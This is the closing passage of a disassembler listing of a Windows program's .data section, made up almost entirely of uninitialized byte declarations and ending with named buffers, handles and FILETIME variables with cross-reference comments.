.data:0040472D                 db    ? ;
.data:0040472E                 db    ? ;
.data:0040472F                 db    ? ;
.data:00404730                 db    ? ;
.data:00404731                 db    ? ;
.data:00404732                 db    ? ;
.data:00404733                 db    ? ;
.data:00404734                 db    ? ;
.data:00404735                 db    ? ;
.data:00404736                 db    ? ;
.data:00404737                 db    ? ;
.data:00404738                 db    ? ;
.data:00404739                 db    ? ;
.data:0040473A                 db    ? ;
.data:0040473B                 db    ? ;
.data:0040473C                 db    ? ;
.data:0040473D                 db    ? ;
.data:0040473E                 db    ? ;
.data:0040473F                 db    ? ;
.data:00404740                 db    ? ;
.data:00404741                 db    ? ;
.data:00404742                 db    ? ;
.data:00404743                 db    ? ;
.data:00404744                 db    ? ;
.data:00404745                 db    ? ;
.data:00404746                 db    ? ;
.data:00404747                 db    ? ;
.data:00404748                 db    ? ;
.data:00404749                 db    ? ;
.data:0040474A                 db    ? ;
.data:0040474B                 db    ? ;
.data:0040474C                 db    ? ;
.data:0040474D                 db    ? ;
.data:0040474E                 db    ? ;
.data:0040474F                 db    ? ;
.data:00404750                 db    ? ;
.data:00404751                 db    ? ;
.data:00404752                 db    ? ;
.data:00404753                 db    ? ;
.data:00404754                 db    ? ;
.data:00404755                 db    ? ;
.data:00404756                 db    ? ;
.data:00404757                 db    ? ;
.data:00404758                 db    ? ;
.data:00404759                 db    ? ;
.data:0040475A                 db    ? ;
.data:0040475B                 db    ? ;
.data:0040475C                 db    ? ;
.data:0040475D                 db    ? ;
.data:0040475E                 db    ? ;
.data:0040475F                 db    ? ;
.data:00404760                 db    ? ;
.data:00404761                 db    ? ;
.data:00404762                 db    ? ;
.data:00404763                 db    ? ;
.data:00404764                 db    ? ;
.data:00404765                 db    ? ;
.data:00404766                 db    ? ;
.data:00404767                 db    ? ;
.data:00404768                 db    ? ;
.data:00404769                 db    ? ;
.data:0040476A                 db    ? ;
.data:0040476B                 db    ? ;
.data:0040476C                 db    ? ;
.data:0040476D                 db    ? ;
.data:0040476E                 db    ? ;
.data:0040476F                 db    ? ;
.data:00404770                 db    ? ;
.data:00404771                 db    ? ;
.data:00404772                 db    ? ;
.data:00404773                 db    ? ;
.data:00404774                 db    ? ;
.data:00404775                 db    ? ;
.data:00404776                 db    ? ;
.data:00404777                 db    ? ;
.data:00404778                 db    ? ;
.data:00404779                 db    ? ;
.data:0040477A                 db    ? ;
.data:0040477B                 db    ? ;
.data:0040477C                 db    ? ;
.data:0040477D                 db    ? ;
.data:0040477E                 db    ? ;
.data:0040477F                 db    ? ;
.data:00404780                 db    ? ;
.data:00404781                 db    ? ;
.data:00404782                 db    ? ;
.data:00404783                 db    ? ;
.data:00404784                 db    ? ;
.data:00404785                 db    ? ;
.data:00404786                 db    ? ;
.data:00404787                 db    ? ;
.data:00404788                 db    ? ;
.data:00404789                 db    ? ;
.data:0040478A                 db    ? ;
.data:0040478B                 db    ? ;
.data:0040478C                 db    ? ;
.data:0040478D                 db    ? ;
.data:0040478E                 db    ? ;
.data:0040478F                 db    ? ;
.data:00404790                 db    ? ;
.data:00404791                 db    ? ;
.data:00404792                 db    ? ;
.data:00404793                 db    ? ;
.data:00404794                 db    ? ;
.data:00404795                 db    ? ;
.data:00404796                 db    ? ;
.data:00404797                 db    ? ;
.data:00404798                 db    ? ;
.data:00404799                 db    ? ;
.data:0040479A                 db    ? ;
.data:0040479B                 db    ? ;
.data:0040479C                 db    ? ;
.data:0040479D                 db    ? ;
.data:0040479E                 db    ? ;
.data:0040479F                 db    ? ;
.data:004047A0                 db    ? ;
.data:004047A1                 db    ? ;
.data:004047A2                 db    ? ;
.data:004047A3                 db    ? ;
.data:004047A4                 db    ? ;
.data:004047A5                 db    ? ;
.data:004047A6                 db    ? ;
.data:004047A7                 db    ? ;
.data:004047A8                 db    ? ;
.data:004047A9                 db    ? ;
.data:004047AA                 db    ? ;
.data:004047AB                 db    ? ;
.data:004047AC                 db    ? ;
.data:004047AD                 db    ? ;
.data:004047AE                 db    ? ;
.data:004047AF                 db    ? ;
.data:004047B0                 db    ? ;
.data:004047B1                 db    ? ;
.data:004047B2                 db    ? ;
.data:004047B3                 db    ? ;
.data:004047B4                 db    ? ;
.data:004047B5                 db    ? ;
.data:004047B6                 db    ? ;
.data:004047B7                 db    ? ;
.data:004047B8                 db    ? ;
.data:004047B9                 db    ? ;
.data:004047BA                 db    ? ;
.data:004047BB                 db    ? ;
.data:004047BC                 db    ? ;
.data:004047BD                 db    ? ;
.data:004047BE                 db    ? ;
.data:004047BF                 db    ? ;
.data:004047C0                 db    ? ;
.data:004047C1                 db    ? ;
.data:004047C2                 db    ? ;
.data:004047C3                 db    ? ;
.data:004047C4                 db    ? ;
.data:004047C5                 db    ? ;
.data:004047C6                 db    ? ;
.data:004047C7                 db    ? ;
.data:004047C8                 db    ? ;
.data:004047C9                 db    ? ;
.data:004047CA                 db    ? ;
.data:004047CB                 db    ? ;
.data:004047CC                 db    ? ;
.data:004047CD                 db    ? ;
.data:004047CE                 db    ? ;
.data:004047CF                 db    ? ;
.data:004047D0                 db    ? ;
.data:004047D1                 db    ? ;
.data:004047D2                 db    ? ;
.data:004047D3                 db    ? ;
.data:004047D4                 db    ? ;
.data:004047D5                 db    ? ;
.data:004047D6                 db    ? ;
.data:004047D7                 db    ? ;
.data:004047D8                 db    ? ;
.data:004047D9                 db    ? ;
.data:004047DA                 db    ? ;
.data:004047DB                 db    ? ;
.data:004047DC                 db    ? ;
.data:004047DD                 db    ? ;
.data:004047DE                 db    ? ;
.data:004047DF                 db    ? ;
.data:004047E0                 db    ? ;
.data:004047E1                 db    ? ;
.data:004047E2                 db    ? ;
.data:004047E3                 db    ? ;
.data:004047E4                 db    ? ;
.data:004047E5                 db    ? ;
.data:004047E6                 db    ? ;
.data:004047E7                 db    ? ;
.data:004047E8                 db    ? ;
.data:004047E9                 db    ? ;
.data:004047EA                 db    ? ;
.data:004047EB                 db    ? ;
.data:004047EC                 db    ? ;
.data:004047ED                 db    ? ;
.data:004047EE                 db    ? ;
.data:004047EF                 db    ? ;
.data:004047F0                 db    ? ;
.data:004047F1                 db    ? ;
.data:004047F2                 db    ? ;
.data:004047F3                 db    ? ;
.data:004047F4                 db    ? ;
.data:004047F5                 db    ? ;
.data:004047F6                 db    ? ;
.data:004047F7                 db    ? ;
.data:004047F8                 db    ? ;
.data:004047F9                 db    ? ;
.data:004047FA                 db    ? ;
.data:004047FB                 db    ? ;
.data:004047FC                 db    ? ;
.data:004047FD                 db    ? ;
.data:004047FE                 db    ? ;
.data:004047FF                 db    ? ;
.data:00404800                 db    ? ;
.data:00404801                 db    ? ;
.data:00404802                 db    ? ;
.data:00404803                 db    ? ;
.data:00404804                 db    ? ;
.data:00404805                 db    ? ;
.data:00404806                 db    ? ;
.data:00404807                 db    ? ;
.data:00404808                 db    ? ;
.data:00404809                 db    ? ;
.data:0040480A                 db    ? ;
.data:0040480B                 db    ? ;
.data:0040480C                 db    ? ;
.data:0040480D                 db    ? ;
.data:0040480E                 db    ? ;
.data:0040480F                 db    ? ;
.data:00404810                 db    ? ;
.data:00404811                 db    ? ;
.data:00404812                 db    ? ;
.data:00404813                 db    ? ;
.data:00404814                 db    ? ;
.data:00404815                 db    ? ;
.data:00404816                 db    ? ;
.data:00404817                 db    ? ;
.data:00404818                 db    ? ;
.data:00404819                 db    ? ;
.data:0040481A                 db    ? ;
.data:0040481B                 db    ? ;
.data:0040481C                 db    ? ;
.data:0040481D                 db    ? ;
.data:0040481E                 db    ? ;
.data:0040481F                 db    ? ;
.data:00404820                 db    ? ;
.data:00404821                 db    ? ;
.data:00404822                 db    ? ;
.data:00404823                 db    ? ;
.data:00404824                 db    ? ;
.data:00404825                 db    ? ;
.data:00404826                 db    ? ;
.data:00404827                 db    ? ;
.data:00404828                 db    ? ;
.data:00404829                 db    ? ;
.data:0040482A                 db    ? ;
.data:0040482B                 db    ? ;
.data:0040482C                 db    ? ;
.data:0040482D                 db    ? ;
.data:0040482E                 db    ? ;
.data:0040482F                 db    ? ;
.data:00404830                 db    ? ;
.data:00404831                 db    ? ;
.data:00404832                 db    ? ;
.data:00404833                 db    ? ;
.data:00404834                 db    ? ;
.data:00404835                 db    ? ;
.data:00404836                 db    ? ;
.data:00404837                 db    ? ;
.data:00404838                 db    ? ;
.data:00404839                 db    ? ;
.data:0040483A                 db    ? ;
.data:0040483B                 db    ? ;
.data:0040483C                 db    ? ;
.data:0040483D                 db    ? ;
.data:0040483E                 db    ? ;
.data:0040483F                 db    ? ;
.data:00404840                 db    ? ;
.data:00404841                 db    ? ;
.data:00404842                 db    ? ;
.data:00404843                 db    ? ;
.data:00404844                 db    ? ;
.data:00404845                 db    ? ;
.data:00404846                 db    ? ;
.data:00404847                 db    ? ;
.data:00404848                 db    ? ;
.data:00404849                 db    ? ;
.data:0040484A                 db    ? ;
.data:0040484B                 db    ? ;
.data:0040484C                 db    ? ;
.data:0040484D                 db    ? ;
.data:0040484E                 db    ? ;
.data:0040484F                 db    ? ;
.data:00404850                 db    ? ;
.data:00404851                 db    ? ;
.data:00404852                 db    ? ;
.data:00404853                 db    ? ;
.data:00404854                 db    ? ;
.data:00404855                 db    ? ;
.data:00404856                 db    ? ;
.data:00404857                 db    ? ;
.data:00404858                 db    ? ;
.data:00404859                 db    ? ;
.data:0040485A                 db    ? ;
.data:0040485B                 db    ? ;
.data:0040485C                 db    ? ;
.data:0040485D                 db    ? ;
.data:0040485E                 db    ? ;
.data:0040485F                 db    ? ;
.data:00404860                 db    ? ;
.data:00404861                 db    ? ;
.data:00404862                 db    ? ;
.data:00404863                 db    ? ;
.data:00404864                 db    ? ;
.data:00404865                 db    ? ;
.data:00404866                 db    ? ;
.data:00404867                 db    ? ;
.data:00404868                 db    ? ;
.data:00404869                 db    ? ;
.data:0040486A                 db    ? ;
.data:0040486B                 db    ? ;
.data:0040486C                 db    ? ;
.data:0040486D                 db    ? ;
.data:0040486E                 db    ? ;
.data:0040486F                 db    ? ;
.data:00404870                 db    ? ;
.data:00404871                 db    ? ;
.data:00404872                 db    ? ;
.data:00404873                 db    ? ;
.data:00404874                 db    ? ;
.data:00404875                 db    ? ;
.data:00404876                 db    ? ;
.data:00404877                 db    ? ;
.data:00404878                 db    ? ;
.data:00404879                 db    ? ;
.data:0040487A                 db    ? ;
.data:0040487B                 db    ? ;
.data:0040487C                 db    ? ;
.data:0040487D                 db    ? ;
.data:0040487E                 db    ? ;
.data:0040487F                 db    ? ;
.data:00404880                 db    ? ;
.data:00404881                 db    ? ;
.data:00404882                 db    ? ;
.data:00404883                 db    ? ;
.data:00404884                 db    ? ;
.data:00404885                 db    ? ;
.data:00404886                 db    ? ;
.data:00404887                 db    ? ;
.data:00404888                 db    ? ;
.data:00404889                 db    ? ;
.data:0040488A                 db    ? ;
.data:0040488B                 db    ? ;
.data:0040488C                 db    ? ;
.data:0040488D                 db    ? ;
.data:0040488E                 db    ? ;
.data:0040488F                 db    ? ;
.data:00404890                 db    ? ;
.data:00404891                 db    ? ;
.data:00404892                 db    ? ;
.data:00404893                 db    ? ;
.data:00404894                 db    ? ;
.data:00404895                 db    ? ;
.data:00404896                 db    ? ;
.data:00404897                 db    ? ;
.data:00404898                 db    ? ;
.data:00404899                 db    ? ;
.data:0040489A                 db    ? ;
.data:0040489B                 db    ? ;
.data:0040489C                 db    ? ;
.data:0040489D                 db    ? ;
.data:0040489E                 db    ? ;
.data:0040489F                 db    ? ;
.data:004048A0                 db    ? ;
.data:004048A1                 db    ? ;
.data:004048A2                 db    ? ;
.data:004048A3                 db    ? ;
.data:004048A4                 db    ? ;
.data:004048A5                 db    ? ;
.data:004048A6                 db    ? ;
.data:004048A7                 db    ? ;
.data:004048A8                 db    ? ;
.data:004048A9                 db    ? ;
.data:004048AA                 db    ? ;
.data:004048AB                 db    ? ;
.data:004048AC                 db    ? ;
.data:004048AD                 db    ? ;
.data:004048AE                 db    ? ;
.data:004048AF                 db    ? ;
.data:004048B0                 db    ? ;
.data:004048B1                 db    ? ;
.data:004048B2                 db    ? ;
.data:004048B3                 db    ? ;
.data:004048B4                 db    ? ;
.data:004048B5                 db    ? ;
.data:004048B6                 db    ? ;
.data:004048B7                 db    ? ;
.data:004048B8                 db    ? ;
.data:004048B9                 db    ? ;
.data:004048BA                 db    ? ;
.data:004048BB                 db    ? ;
.data:004048BC                 db    ? ;
.data:004048BD                 db    ? ;
.data:004048BE                 db    ? ;
.data:004048BF                 db    ? ;
.data:004048C0                 db    ? ;
.data:004048C1                 db    ? ;
.data:004048C2                 db    ? ;
.data:004048C3                 db    ? ;
.data:004048C4                 db    ? ;
.data:004048C5                 db    ? ;
.data:004048C6                 db    ? ;
.data:004048C7                 db    ? ;
.data:004048C8                 db    ? ;
.data:004048C9                 db    ? ;
.data:004048CA                 db    ? ;
.data:004048CB                 db    ? ;
.data:004048CC                 db    ? ;
.data:004048CD                 db    ? ;
.data:004048CE                 db    ? ;
.data:004048CF                 db    ? ;
.data:004048D0                 db    ? ;
.data:004048D1                 db    ? ;
.data:004048D2                 db    ? ;
.data:004048D3                 db    ? ;
.data:004048D4                 db    ? ;
.data:004048D5                 db    ? ;
.data:004048D6                 db    ? ;
.data:004048D7                 db    ? ;
.data:004048D8                 db    ? ;
.data:004048D9                 db    ? ;
.data:004048DA                 db    ? ;
.data:004048DB                 db    ? ;
.data:004048DC                 db    ? ;
.data:004048DD                 db    ? ;
.data:004048DE                 db    ? ;
.data:004048DF                 db    ? ;
.data:004048E0                 db    ? ;
.data:004048E1                 db    ? ;
.data:004048E2                 db    ? ;
.data:004048E3                 db    ? ;
.data:004048E4                 db    ? ;
.data:004048E5                 db    ? ;
.data:004048E6                 db    ? ;
.data:004048E7                 db    ? ;
.data:004048E8                 db    ? ;
.data:004048E9                 db    ? ;
.data:004048EA                 db    ? ;
.data:004048EB                 db    ? ;
.data:004048EC                 db    ? ;
.data:004048ED                 db    ? ;
.data:004048EE                 db    ? ;
.data:004048EF                 db    ? ;
.data:004048F0                 db    ? ;
.data:004048F1                 db    ? ;
.data:004048F2                 db    ? ;
.data:004048F3                 db    ? ;
.data:004048F4                 db    ? ;
.data:004048F5                 db    ? ;
.data:004048F6                 db    ? ;
.data:004048F7                 db    ? ;
.data:004048F8                 db    ? ;
.data:004048F9                 db    ? ;
.data:004048FA                 db    ? ;
.data:004048FB                 db    ? ;
.data:004048FC                 db    ? ;
.data:004048FD                 db    ? ;
.data:004048FE                 db    ? ;
.data:004048FF                 db    ? ;
.data:00404900                 db    ? ;
.data:00404901                 db    ? ;
.data:00404902                 db    ? ;
.data:00404903                 db    ? ;
.data:00404904                 db    ? ;
.data:00404905                 db    ? ;
.data:00404906                 db    ? ;
.data:00404907                 db    ? ;
.data:00404908                 db    ? ;
.data:00404909                 db    ? ;
.data:0040490A                 db    ? ;
.data:0040490B                 db    ? ;
.data:0040490C                 db    ? ;
.data:0040490D                 db    ? ;
.data:0040490E                 db    ? ;
.data:0040490F                 db    ? ;
.data:00404910                 db    ? ;
.data:00404911                 db    ? ;
.data:00404912                 db    ? ;
.data:00404913                 db    ? ;
.data:00404914                 db    ? ;
.data:00404915                 db    ? ;
.data:00404916                 db    ? ;
.data:00404917                 db    ? ;
.data:00404918                 db    ? ;
.data:00404919                 db    ? ;
.data:0040491A                 db    ? ;
.data:0040491B                 db    ? ;
.data:0040491C                 db    ? ;
.data:0040491D                 db    ? ;
.data:0040491E                 db    ? ;
.data:0040491F                 db    ? ;
.data:00404920                 db    ? ;
.data:00404921                 db    ? ;
.data:00404922                 db    ? ;
.data:00404923                 db    ? ;
.data:00404924                 db    ? ;
.data:00404925                 db    ? ;
.data:00404926                 db    ? ;
.data:00404927                 db    ? ;
.data:00404928                 db    ? ;
.data:00404929                 db    ? ;
.data:0040492A                 db    ? ;
.data:0040492B                 db    ? ;
.data:0040492C                 db    ? ;
.data:0040492D                 db    ? ;
.data:0040492E                 db    ? ;
.data:0040492F                 db    ? ;
.data:00404930                 db    ? ;
.data:00404931                 db    ? ;
.data:00404932                 db    ? ;
.data:00404933                 db    ? ;
.data:00404934                 db    ? ;
.data:00404935                 db    ? ;
.data:00404936                 db    ? ;
.data:00404937                 db    ? ;
.data:00404938                 db    ? ;
.data:00404939                 db    ? ;
.data:0040493A                 db    ? ;
.data:0040493B                 db    ? ;
.data:0040493C                 db    ? ;
.data:0040493D                 db    ? ;
.data:0040493E                 db    ? ;
.data:0040493F                 db    ? ;
.data:00404940                 db    ? ;
.data:00404941                 db    ? ;
.data:00404942                 db    ? ;
.data:00404943                 db    ? ;
.data:00404944                 db    ? ;
.data:00404945                 db    ? ;
.data:00404946                 db    ? ;
.data:00404947                 db    ? ;
.data:00404948                 db    ? ;
.data:00404949                 db    ? ;
.data:0040494A                 db    ? ;
.data:0040494B                 db    ? ;
.data:0040494C                 db    ? ;
.data:0040494D                 db    ? ;
.data:0040494E                 db    ? ;
.data:0040494F                 db    ? ;
.data:00404950 ; CHAR ExistingFileName[1280]
.data:00404950 ExistingFileName db 500h dup(?)         ; DATA XREF: sub_4013A8+1A8↑o
.data:00404950                                         ; sub_4013A8+230↑o ...
.data:00404E50 ; CHAR Buffer[512]
.data:00404E50 Buffer          db 200h dup(?)          ; DATA XREF: start+F↑o
.data:00404E50                                         ; start+1E↑o
.data:00405050 ; CHAR pszSpec[512]
.data:00405050 pszSpec         db 200h dup(?)          ; DATA XREF: sub_40124F+28↑o
.data:00405050                                         ; sub_40124F+37↑o ...
.data:00405250 ; CHAR pszPath[512]
.data:00405250 pszPath         db 200h dup(?)          ; DATA XREF: sub_401000+4↑o
.data:00405250                                         ; sub_401000+10↑o
.data:00405450 ; CHAR Filename[1278]
.data:00405450 Filename        db 4FEh dup(?)          ; DATA XREF: sub_40214B+3F↑o
.data:00405450                                         ; start+32↑o ...
.data:0040594E ; char byte_40594E[]
.data:0040594E byte_40594E     db ?                    ; DATA XREF: sub_402342+BF↑w
.data:0040594F                 align 10h
.data:00405950 ; CHAR String[512]
.data:00405950 String          db 200h dup(?)          ; DATA XREF: start+23↑o
.data:00405950                                         ; start+6A↑o ...
.data:00405B50 ; CHAR NewFileName[2560]
.data:00405B50 NewFileName     db 0A00h dup(?)         ; DATA XREF: sub_4013A8+1C0↑o
.data:00405B50                                         ; sub_4013A8+1CF↑o ...
.data:00406550 byte_406550     db ?                    ; DATA XREF: sub_40124F+59↑w
.data:00406550                                         ; sub_40124F:loc_4012B1↑w ...
.data:00406551 ; HANDLE hFile
.data:00406551 hFile           dd ?                    ; DATA XREF: sub_40103A+70↑w
.data:00406551                                         ; sub_40103A+8E↑r ...
.data:00406555 dword_406555    dd ?                    ; DATA XREF: sub_4013A8+256↑w
.data:00406559 ; LPCVOID lpBuffer
.data:00406559 lpBuffer        dd ?                    ; DATA XREF: sub_4013A8+2AC↑r
.data:00406559                                         ; sub_4013A8+33A↑r ...
.data:0040655D ; DWORD nNumberOfBytesToWrite
.data:0040655D nNumberOfBytesToWrite dd ?              ; DATA XREF: sub_4013A8+2A1↑o
.data:0040655D                                         ; sub_4013A8+2BD↑r ...
.data:00406561 ; DWORD NumberOfBytesWritten
.data:00406561 NumberOfBytesWritten dd ?               ; DATA XREF: sub_40103A+82↑o
.data:00406561                                         ; sub_4013A8+32F↑o
.data:00406565 ; BYTE byte_406565
.data:00406565 byte_406565     db ?                    ; DATA XREF: sub_401AB9+CE↑o
.data:00406565                                         ; sub_401AB9+E7↑o ...
.data:00406566                 db    ? ;
.data:00406567                 db    ? ;
.data:00406568                 db    ? ;
.data:00406569                 db    ? ;
.data:0040656A                 db    ? ;
.data:0040656B                 db    ? ;
.data:0040656C                 db    ? ;
.data:0040656D                 db    ? ;
.data:0040656E                 db    ? ;
.data:0040656F                 db    ? ;
.data:00406570                 db    ? ;
.data:00406571                 db    ? ;
.data:00406572                 db    ? ;
.data:00406573                 db    ? ;
.data:00406574                 db    ? ;
.data:00406575 ; BYTE byte_406575
.data:00406575 byte_406575     db ?                    ; DATA XREF: sub_401AB9+E0↑o
.data:00406575                                         ; sub_401AB9+FA↑o ...
.data:00406576                 db    ? ;
.data:00406577                 db    ? ;
.data:00406578                 db    ? ;
.data:00406579                 db    ? ;
.data:0040657A                 db    ? ;
.data:0040657B                 db    ? ;
.data:0040657C                 db    ? ;
.data:0040657D                 db    ? ;
.data:0040657E                 db    ? ;
.data:0040657F                 db    ? ;
.data:00406580                 db    ? ;
.data:00406581                 db    ? ;
.data:00406582                 db    ? ;
.data:00406583                 db    ? ;
.data:00406584                 db    ? ;
.data:00406585 dword_406585    dd ?                    ; DATA XREF: sub_4013A8+2E1↑o
.data:00406585                                         ; sub_4017EC+24↑r ...
.data:00406589 dword_406589    dd ?                    ; DATA XREF: sub_4017EC+2F↑r
.data:00406589                                         ; sub_4017EC+73↑r ...
.data:0040658D dword_40658D    dd ?                    ; DATA XREF: sub_4017EC+43↑r
.data:0040658D                                         ; sub_4017EC+87↑r ...
.data:00406591 dword_406591    dd ?                    ; DATA XREF: sub_4017EC+4E↑r
.data:00406591                                         ; sub_4017EC+92↑r ...
.data:00406595 dword_406595    dd ?                    ; DATA XREF: sub_40124F+1A↑o
.data:00406595                                         ; sub_4013A8+2DC↑o ...
.data:00406599 dword_406599    dd ?                    ; DATA XREF: sub_4017B4+15↑w
.data:0040659D dword_40659D    dd ?                    ; DATA XREF: sub_4017B4+25↑w
.data:004065A1 dword_4065A1    dd ?                    ; DATA XREF: sub_4017B4+2B↑w
.data:004065A5 dword_4065A5    dd ?                    ; DATA XREF: sub_4017EC+A1↑r
.data:004065A5                                         ; sub_4018B0+13↑r ...
.data:004065A9 ; LONG lDistanceToMove
.data:004065A9 lDistanceToMove dd ?                    ; DATA XREF: sub_4013A8+28E↑r
.data:004065A9                                         ; sub_4013A8+31C↑r ...
.data:004065AD ; DWORD nNumberOfBytesToRead
.data:004065AD nNumberOfBytesToRead dd ?               ; DATA XREF: sub_4013A8+2A6↑r
.data:004065AD                                         ; sub_401748+9↑r ...
.data:004065B1                 db    ? ;
.data:004065B2                 db    ? ;
.data:004065B3                 db    ? ;
.data:004065B4                 db    ? ;
.data:004065B5 ; HANDLE hHeap
.data:004065B5 hHeap           dd ?                    ; DATA XREF: sub_401F87+81↑r
.data:004065B5                                         ; sub_401F87+B1↑r ...
.data:004065B9 ; CHAR byte_4065B9[256]
.data:004065B9 byte_4065B9     db 100h dup(?)          ; DATA XREF: sub_402342+5↑o
.data:004065B9                                         ; sub_402342+15↑o ...
.data:004066B9 ; CHAR File[512]
.data:004066B9 File            db 200h dup(?)          ; DATA XREF: sub_40214B+21↑o
.data:004066B9                                         ; sub_40214B+66↑o
.data:004068B9 ; CHAR Parameters[1280]
.data:004068B9 Parameters      db 500h dup(?)          ; DATA XREF: sub_40214B+35↑o
.data:004068B9                                         ; sub_40214B+44↑o ...
.data:00406DB9 ; _BYTE dword_406DB9[16]
.data:00406DB9 dword_406DB9    dd ?                    ; DATA XREF: sub_40124F+F↑o
.data:00406DB9                                         ; sub_401748+24↑r ...
.data:00406DBD unk_406DBD      db    ? ;
.data:00406DBE                 db    ? ;
.data:00406DBF                 db    ? ;
.data:00406DC0                 db    ? ;
.data:00406DC1 unk_406DC1      db    ? ;
.data:00406DC2                 db    ? ;
.data:00406DC3                 db    ? ;
.data:00406DC4                 db    ? ;
.data:00406DC5 unk_406DC5      db    ? ;
.data:00406DC6                 db    ? ;
.data:00406DC7                 db    ? ;
.data:00406DC8                 db    ? ;
.data:00406DC9 unk_406DC9      db    ? ;               ; DATA XREF: sub_401AB9+134↑o
.data:00406DC9                                         ; sub_401F87+10C↑o
.data:00406DCA                 db    ? ;
.data:00406DCB                 db    ? ;
.data:00406DCC                 db    ? ;
.data:00406DCD                 db    ? ;
.data:00406DCE                 db    ? ;
.data:00406DCF                 db    ? ;
.data:00406DD0                 db    ? ;
.data:00406DD1                 db    ? ;
.data:00406DD2                 db    ? ;
.data:00406DD3                 db    ? ;
.data:00406DD4                 db    ? ;
.data:00406DD5                 db    ? ;
.data:00406DD6                 db    ? ;
.data:00406DD7                 db    ? ;
.data:00406DD8                 db    ? ;
.data:00406DD9 ; CHAR byte_406DD9[16]
.data:00406DD9 byte_406DD9     db 10h dup(?)           ; DATA XREF: sub_401F87+12C↑o
.data:00406DD9                                         ; start+65↑o
.data:00406DE9 ; CHAR byte_406DE9[16]
.data:00406DE9 byte_406DE9     db 10h dup(?)           ; DATA XREF: sub_401F87+13C↑o
.data:00406DE9                                         ; sub_402342+1F↑o ...
.data:00406DF9 ; CHAR String1[32]
.data:00406DF9 String1         db 20h dup(?)           ; DATA XREF: sub_4010FC+B↑o
.data:00406DF9                                         ; sub_4010FC+2C↑o ...
.data:00406E19 ; CHAR pvParam[512]
.data:00406E19 pvParam         db 200h dup(?)          ; DATA XREF: sub_4010FC+36↑o
.data:00406E19                                         ; sub_4010FC+4A↑o ...
.data:00407019 ; CHAR FileName[1280]
.data:00407019 FileName        db 500h dup(?)          ; DATA XREF: sub_40103A+6↑o
.data:00407019                                         ; sub_40103A+10↑o ...
.data:00407519 dword_407519    dd ?                    ; DATA XREF: sub_4013A8:loc_40151B↑r
.data:00407519                                         ; sub_401F87:loc_40201C↑w ...
.data:0040751D ; LPCSTR lpText
.data:0040751D lpText          dd ?                    ; DATA XREF: sub_401000+27↑r
.data:0040751D                                         ; sub_40103A+75↑r ...
.data:00407521 ; LPCSTR lpSubKey
.data:00407521 lpSubKey        dd ?                    ; DATA XREF: sub_40124F+41↑r
.data:00407521                                         ; sub_4013A8+1D9↑r ...
.data:00407525 dword_407525    dd ?                    ; DATA XREF: sub_401AB9+79↑r
.data:00407525                                         ; sub_401AB9:loc_401B56↑w ...
.data:00407529 byte_407529     db ?                    ; DATA XREF: sub_401F87+11C↑o
.data:00407529                                         ; start+E0↑r
.data:0040752A byte_40752A     db ?                    ; DATA XREF: sub_4013A8+12B↑r
.data:0040752B byte_40752B     db ?                    ; DATA XREF: sub_401000+1A↑r
.data:0040752B                                         ; sub_401AB9+325↑r
.data:0040752C byte_40752C     db ?                    ; DATA XREF: sub_4013A8+2F3↑r
.data:0040752D byte_40752D     db ?                    ; DATA XREF: sub_40103A+1A↑r
.data:0040752D                                         ; sub_401216↑r ...
.data:0040752E ; FILETIME stru_40752E
.data:0040752E stru_40752E     FILETIME <?>            ; DATA XREF: sub_4013A8+27A↑o
.data:0040752E                                         ; sub_4013A8+355↑o
.data:00407536 ; FILETIME stru_407536
.data:00407536 stru_407536     FILETIME <?>            ; DATA XREF: sub_4013A8+275↑o
.data:00407536                                         ; sub_4013A8+350↑o
.data:0040753E ; FILETIME stru_40753E
.data:0040753E stru_40753E     FILETIME <?>            ; DATA XREF: sub_4013A8:loc_401618↑o
.data:0040753E                                         ; sub_4013A8:loc_4016F3↑o
.data:00407546 ; FILETIME CreationTime
.data:00407546 CreationTime    FILETIME <?>            ; DATA XREF: sub_40103A+A3↑o
.data:00407546                                         ; sub_4010FC+EB↑o ...
.data:0040754E ; FILETIME LastAccessTime
.data:0040754E LastAccessTime  FILETIME <?>            ; DATA XREF: sub_40103A+9E↑o
.data:0040754E                                         ; sub_4010FC+E6↑o ...
.data:00407556 ; FILETIME LastWriteTime
.data:00407556 LastWriteTime   FILETIME <?>            ; DATA XREF: sub_40103A+99↑o
.data:00407556                                         ; sub_4010FC+E1↑o ...
.data:0040755E ; CHAR byte_40755E[512]
.data:0040755E byte_40755E     db 200h dup(?)          ; DATA XREF: sub_402472+B↑o
.data:0040755E                                         ; sub_402472+15↑o ...
.data:0040775E dword_40775E    dd ?                    ; DATA XREF: start-84C↑w
.data:0040775E                                         ; start-845↑r
.data:00407762 ; HWND hWnd
.data:00407762 hWnd            dd ?                    ; DATA XREF: start-757↑w
.data:00407762                                         ; start-752↑r
.data:00407766 ; HINSTANCE hInstance
.data:00407766 hInstance       dd ?                    ; DATA XREF: start-856↑w
.data:00407766                                         ; start-83D↑r ...
.data:0040776A dword_40776A    dd ?                    ; DATA XREF: sub_401AB9+2B6↑w
.data:0040776E dword_40776E    dd ?                    ; DATA XREF: sub_401AB9+252↑w
.data:00407772 dword_407772    dd ?                    ; DATA XREF: sub_401AB9:loc_401DC9↑w
.data:00407776 dword_407776    dd ?                    ; DATA XREF: sub_401AB9+284↑w
.data:0040777A ; WPARAM wParam
.data:0040777A wParam          dd ?                    ; DATA XREF: sub_401AB9+1E1↑w
.data:0040777A                                         ; sub_401AB9+227↑r ...
.data:0040777E ; LOGFONTA lf
.data:0040777E lf              LOGFONTA <?>            ; DATA XREF: sub_401AB9+1B9↑w
.data:0040777E                                         ; sub_401AB9+1D7↑o ...
.data:004077BA ; BYTE pbData
.data:004077BA pbData          db 846h dup(?)          ; DATA XREF: sub_401AB9+A8↑o
.data:004077BA                                         ; sub_401AB9+C2↑o ...
.data:004077BA _data           ends
.data:004077BA
.data:004077BA
.data:004077BA                 end start
